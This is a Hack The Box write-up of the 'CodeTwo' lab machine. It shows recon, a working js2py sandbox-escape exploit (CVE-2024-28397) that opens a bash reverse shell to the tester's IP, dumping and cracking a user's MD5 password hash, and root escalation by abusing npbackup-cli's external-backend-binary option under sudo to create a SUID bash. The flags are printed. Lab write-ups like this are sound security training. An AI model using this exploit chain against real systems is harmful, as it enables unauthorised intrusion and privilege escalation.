---
tags:
  - HTB
  - Hacking
  - Boot2Root
  - Linux
  - JS2PY
  - Backup
---
# Overview

| Name        | CodeTwo   |
| ----------- | --------- |
| OS          | Linux     |
| Base Points | Easy [20] |
| Status      | Done      |
# Recon
## Nmap

```bash
┌──(at0m㉿DESKTOP-HSPMATJ)-[~]
└─$ sudo nmap -sC -sV codetwo.htb
[sudo] password for at0m:
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-19 15:28 +0545
Nmap scan report for codetwo.htb (10.10.11.82)
Host is up (0.64s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Welcome to CodeTwo
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Port 8080

Site has download option downloaded `app.zip`.

```python
┌──(at0m㉿DESKTOP-HSPMATJ)-[/mnt/…/At0m/Temp/htb/app]
└─$ cat app.py
from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory
from flask_sqlalchemy import SQLAlchemy
import hashlib
import js2py
import os
import json

js2py.disable_pyimport()
app = Flask(__name__)
app.secret_key = 'S3cr3tK3yC0d3Tw0'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password_hash = db.Column(db.String(128), nullable=False)

class CodeSnippet(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    code = db.Column(db.Text, nullable=False)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/dashboard')
def dashboard():
    if 'user_id' in session:
        user_codes = CodeSnippet.query.filter_by(user_id=session['user_id']).all()
        return render_template('dashboard.html', codes=user_codes)
    return redirect(url_for('login'))

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        password_hash = hashlib.md5(password.encode()).hexdigest()
        new_user = User(username=username, password_hash=password_hash)
        db.session.add(new_user)
        db.session.commit()
        return redirect(url_for('login'))
    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        password_hash = hashlib.md5(password.encode()).hexdigest()
        user = User.query.filter_by(username=username, password_hash=password_hash).first()
        if user:
            session['user_id'] = user.id
            session['username'] = username;
            return redirect(url_for('dashboard'))
        return "Invalid credentials"
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('user_id', None)
    return redirect(url_for('index'))

@app.route('/save_code', methods=['POST'])
def save_code():
    if 'user_id' in session:
        code = request.json.get('code')
        new_code = CodeSnippet(user_id=session['user_id'], code=code)
        db.session.add(new_code)
        db.session.commit()
        return jsonify({"message": "Code saved successfully"})
    return jsonify({"error": "User not logged in"}), 401

@app.route('/download')
def download():
    return send_from_directory(directory='/home/app/app/static/', path='app.zip', as_attachment=True)

@app.route('/delete_code/<int:code_id>', methods=['POST'])
def delete_code(code_id):
    if 'user_id' in session:
        code = CodeSnippet.query.get(code_id)
        if code and code.user_id == session['user_id']:
            db.session.delete(code)
            db.session.commit()
            return jsonify({"message": "Code deleted successfully"})
        return jsonify({"error": "Code not found"}), 404
    return jsonify({"error": "User not logged in"}), 401

@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    app.run(host='0.0.0.0', debug=True)
```

```bash
┌──(at0m㉿DESKTOP-HSPMATJ)-[/mnt/…/Temp/htb/app/instance]
└─$ sqlite3 users.db
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
code_snippet  user
sqlite> SELECT * FROM user;
sqlite> SELECT * FROM code_snippet;
sqlite>
```

Nothing in DB.

Registering and login shows a JS code editor and noticed `js2py` library being used.
# Exploitation
## CVE-2024-28397-js2py-Sandbox-Escape

Found this [repo](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape).

```js
let cmd = "/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.93/4444 0>&1'"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11
```

Run this and you will get shell.

```bash
PS C:\Users\At0m\Temp\nc.exe> .\nc.exe -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.93] from (UNKNOWN) [10.10.11.82] 57560
bash: cannot set terminal process group (866): Inappropriate ioctl for device
bash: no job control in this shell
app@codetwo:~/app$ ls
ls
app.py
instance
__pycache__
requirements.txt
static
templates
app@codetwo:~/app$ pwd
pwd
/home/app/app
app@codetwo:~/app$ cd /home
cd /home
app@codetwo:/home$ ls
ls
app
marco
app@codetwo:/home$ cd marco
cd marco
bash: cd: marco: Permission denied
```

Marco creds.

```bash
app@codetwo:~/app$ cd instance
cd instance
app@codetwo:~/app/instance$ ls
ls
users.db
app@codetwo:~/app/instance$ sqlite3 users.db ".tables"
sqlite3 users.db ".tables"
code_snippet  user
app@codetwo:~/app/instance$ sqlite3 users.db "SELECT * FROM user;"
sqlite3 users.db "SELECT * FROM user;"
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
3|admin|32250170a0dca92d53ec9624f336ca24
```

Use crackstation to crack marco hash we get `sweetangelbabylove`. SSH.

```bash
┌──(venv)─(at0m㉿DESKTOP-HSPMATJ)-[/mnt/…/At0m/Temp/htb/app]
└─$ ssh marco@codetwo.htb
The authenticity of host 'codetwo.htb (10.10.11.82)' can't be established.
ED25519 key fingerprint is SHA256:KGKFyaW9Pm7DDxZe/A8oi/0hkygmBMA8Y33zxkEjcD4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'codetwo.htb' (ED25519) to the list of known hosts.
marco@codetwo.htb's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue 19 Aug 2025 03:06:02 PM UTC

  System load:           1.15
  Usage of /:            57.0% of 5.08GB
  Memory usage:          25%
  Swap usage:            0%
  Processes:             228
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.82
  IPv6 address for eth0: dead:beef::250:56ff:feb0:9a4d


Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Aug 19 15:06:03 2025 from 10.10.14.93
marco@codetwo:~$ ls
backups  npbackup.conf  user.txt
marco@codetwo:~$ cat user.txt
9840ae9038662045914e439eb9144bc9
```
# Privilege Escalation

```bash
marco@codetwo:~$ cat npbackup.conf
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri:
      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
    repo_group: default_group
    backup_opts:
      paths:
      - /home/app/app/
      source_type: folder_list
      exclude_files_larger_than: 0.0
    repo_opts:
      repo_password:
        __NPBACKUP__v2zdDN21b0c7TSeUZlwezkPj3n8wlR9Cu1IJSMrSctoxNzQzOTEwMDcxLjM5NjcyNQ8PDw8PDw8PDw8PDw8PD0z8n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPBACKUP__
      retention_policy: {}
      prune_max_unused: 0
    prometheus: {}
    env: {}
    is_protected: false
groups:
  default_group:
    backup_opts:
      paths: []
      source_type:
      stdin_from_command:
      stdin_filename:
      tags: []
      compression: auto
      use_fs_snapshot: true
      ignore_cloud_files: true
      one_file_system: false
      priority: low
      exclude_caches: true
      excludes_case_ignore: false
      exclude_files:
      - excludes/generic_excluded_extensions
      - excludes/generic_excludes
      - excludes/windows_excludes
      - excludes/linux_excludes
      exclude_patterns: []
      exclude_files_larger_than:
      additional_parameters:
      additional_backup_only_parameters:
      minimum_backup_size_error: 10 MiB
      pre_exec_commands: []
      pre_exec_per_command_timeout: 3600
      pre_exec_failure_is_fatal: false
      post_exec_commands: []
      post_exec_per_command_timeout: 3600
      post_exec_failure_is_fatal: false
      post_exec_execute_even_on_backup_error: true
      post_backup_housekeeping_percent_chance: 0
      post_backup_housekeeping_interval: 0
    repo_opts:
      repo_password:
      repo_password_command:
      minimum_backup_age: 1440
      upload_speed: 800 Mib
      download_speed: 0 Mib
      backend_connections: 0
      retention_policy:
        last: 3
        hourly: 72
        daily: 30
        weekly: 4
        monthly: 12
        yearly: 3
        tags: []
        keep_within: true
        group_by_host: true
        group_by_tags: true
        group_by_paths: false
        ntp_server:
      prune_max_unused: 0 B
      prune_max_repack_size:
    prometheus:
      backup_job: ${MACHINE_ID}
      group: ${MACHINE_GROUP}
    env:
      env_variables: {}
      encrypted_env_variables: {}
    is_protected: false
identity:
  machine_id: ${HOSTNAME}__blw0
  machine_group:
global_prometheus:
  metrics: false
  instance: ${MACHINE_ID}
  destination:
  http_username:
  http_password:
  additional_labels: {}
  no_cert_verify: false
global_options:
  auto_upgrade: false
  auto_upgrade_percent_chance: 5
  auto_upgrade_interval: 15
  auto_upgrade_server_url:
  auto_upgrade_server_username:
  auto_upgrade_server_password:
  auto_upgrade_host_identity: ${MACHINE_ID}
  auto_upgrade_group: ${MACHINE_GROUP}
```

```bash
marco@codetwo:~$ sudo -l
Matching Defaults entries for marco on codetwo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codetwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

```bash
marco@codetwo:~$ sudo /usr/local/bin/npbackup-cli --help
usage: npbackup-cli [-h] [-c CONFIG_FILE] [--repo-name REPO_NAME] [--repo-group REPO_GROUP] [-b] [-f] [-r RESTORE] [-s] [--ls [LS]] [--find FIND]
                    [--forget FORGET] [--policy] [--housekeeping] [--quick-check] [--full-check] [--check CHECK] [--prune [PRUNE]] [--prune-max]
                    [--unlock] [--repair-index] [--repair-packs REPAIR_PACKS] [--repair-snapshots] [--repair REPAIR] [--recover] [--list LIST]
                    [--dump DUMP] [--stats [STATS]] [--raw RAW] [--init] [--has-recent-snapshot] [--restore-includes RESTORE_INCLUDES]
                    [--snapshot-id SNAPSHOT_ID] [--json] [--stdin] [--stdin-filename STDIN_FILENAME] [-v] [-V] [--dry-run] [--no-cache]
                    [--license] [--auto-upgrade] [--log-file LOG_FILE] [--show-config] [--external-backend-binary EXTERNAL_BACKEND_BINARY]
                    [--group-operation GROUP_OPERATION] [--create-key CREATE_KEY] [--create-backup-scheduled-task CREATE_BACKUP_SCHEDULED_TASK]
                    [--create-housekeeping-scheduled-task CREATE_HOUSEKEEPING_SCHEDULED_TASK] [--check-config-file]

Portable Network Backup Client This program is distributed under the GNU General Public License and comes with ABSOLUTELY NO WARRANTY. This is
free software, and you are welcome to redistribute it under certain conditions; Please type --license for more info.

optional arguments:
  -h, --help            show this help message and exit
  -c CONFIG_FILE, --config-file CONFIG_FILE
                        Path to alternative configuration file (defaults to current dir/npbackup.conf)
  --repo-name REPO_NAME
                        Name of the repository to work with. Defaults to 'default'. This can also be a comma separated list of repo names. Can
                        accept special name '__all__' to work with all repositories.
  --repo-group REPO_GROUP
                        Comme separated list of groups to work with. Can accept special name '__all__' to work with all repositories.
  -b, --backup          Run a backup
  -f, --force           Force running a backup regardless of existing backups age
  -r RESTORE, --restore RESTORE
                        Restore to path given by --restore, add --snapshot-id to specify a snapshot other than latest
  -s, --snapshots       Show current snapshots
  --ls [LS]             Show content given snapshot. When no snapshot id is given, latest is used
  --find FIND           Find full path of given file / directory
  --forget FORGET       Forget given snapshot (accepts comma separated list of snapshots)
  --policy              Apply retention policy to snapshots (forget snapshots)
  --housekeeping        Run --check quick, --policy and --prune in one go
  --quick-check         Deprecated in favor of --'check quick'. Quick check repository
  --full-check          Deprecated in favor of '--check full'. Full check repository (read all data)
  --check CHECK         Checks the repository. Valid arguments are 'quick' (metadata check) and 'full' (metadata + data check)
  --prune [PRUNE]       Prune data in repository, also accepts max parameter in order prune reclaiming maximum space
  --prune-max           Deprecated in favor of --prune max
  --unlock              Unlock repository
  --repair-index        Deprecated in favor of '--repair index'.Repair repo index
  --repair-packs REPAIR_PACKS
                        Deprecated in favor of '--repair packs'. Repair repo packs ids given by --repair-packs
  --repair-snapshots    Deprecated in favor of '--repair snapshots'.Repair repo snapshots
  --repair REPAIR       Repair the repository. Valid arguments are 'index', 'snapshots', or 'packs'
  --recover             Recover lost repo snapshots
  --list LIST           Show [blobs|packs|index|snapshots|keys|locks] objects
  --dump DUMP           Dump a specific file to stdout (full path given by --ls), use with --dump [file], add --snapshot-id to specify a snapshot
                        other than latest
  --stats [STATS]       Get repository statistics. If snapshot id is given, only snapshot statistics will be shown. You may also pass "--mode raw-
                        data" or "--mode debug" (with double quotes) to get full repo statistics
  --raw RAW             Run raw command against backend. Use with --raw "my raw backend command"
  --init                Manually initialize a repo (is done automatically on first backup)
  --has-recent-snapshot
                        Check if a recent snapshot exists
  --restore-includes RESTORE_INCLUDES
                        Restore only paths within include path, comma separated list accepted
  --snapshot-id SNAPSHOT_ID
                        Choose which snapshot to use. Defaults to latest
  --json                Run in JSON API mode. Nothing else than JSON will be printed to stdout
  --stdin               Backup using data from stdin input
  --stdin-filename STDIN_FILENAME
                        Alternate filename for stdin, defaults to 'stdin.data'
  -v, --verbose         Show verbose output
  -V, --version         Show program version
  --dry-run             Run operations in test mode, no actual modifications
  --no-cache            Run operations without cache
  --license             Show license
  --auto-upgrade        Auto upgrade NPBackup
  --log-file LOG_FILE   Optional path for logfile
  --show-config         Show full inherited configuration for current repo. Optionally you can set NPBACKUP_MANAGER_PASSWORD env variable for more
                        details.
  --external-backend-binary EXTERNAL_BACKEND_BINARY
                        Full path to alternative external backend binary
  --group-operation GROUP_OPERATION
                        Deprecated command to launch operations on multiple repositories. Not needed anymore. Replaced by --repo-name x,y or
                        --repo-group x,y
  --create-key CREATE_KEY
                        Create a new encryption key, requires a file path
  --create-backup-scheduled-task CREATE_BACKUP_SCHEDULED_TASK
                        Create a scheduled backup task, specify an argument interval via interval=minutes, or hour=hour,minute=minute for a daily
                        task
  --create-housekeeping-scheduled-task CREATE_HOUSEKEEPING_SCHEDULED_TASK
                        Create a scheduled housekeeping task, specify hour=hour,minute=minute for a daily task
  --check-config-file   Check if config file is valid
marco@codetwo:~$
```

```bash
#!/bin/sh
# print something so npbackup-cli doesn't crash
echo "restic 0.0.0"

# then do your SUID shell
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
```

Use `npbackup.conf` file given in home directory.

```bash
marco@codetwo:~$ vi /tmp/pwn.sh
marco@codetwo:~$ chmod +x /tmp/pwn.sh
marco@codetwo:~$ sudo /usr/local/bin/npbackup-cli -c ~/npbackup.conf --external-backend-binary=/tmp/pwn.sh --init
2025-08-19 15:18:51,476 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-08-19 15:18:51,505 :: INFO :: Loaded config 4E3B3BFD in /home/marco/npbackup.conf
2025-08-19 15:18:51,575 :: INFO :: Using binary restic 0.0.0
2025-08-19 15:18:51,576 :: INFO :: Initializing repo default
restic 0.0.0
2025-08-19 15:18:51,590 :: INFO :: Runner took 0.074378 seconds for init
2025-08-19 15:18:51,591 :: ERROR :: Backend finished with errors.
2025-08-19 15:18:51,591 :: ERROR :: Operation finished
2025-08-19 15:18:51,599 :: INFO :: ExecTime = 0:00:00.125390, finished, state is: errors.
marco@codetwo:~$ ls -l /tmp/rootbash
-rwsr-xr-x 1 root root 1183448 Aug 19 15:18 /tmp/rootbash
marco@codetwo:~$ /tmp/rootbash -p
rootbash-5.0# cat /root/root.txt
53417abed60eebe1252bde11bc5a5aee
```

---
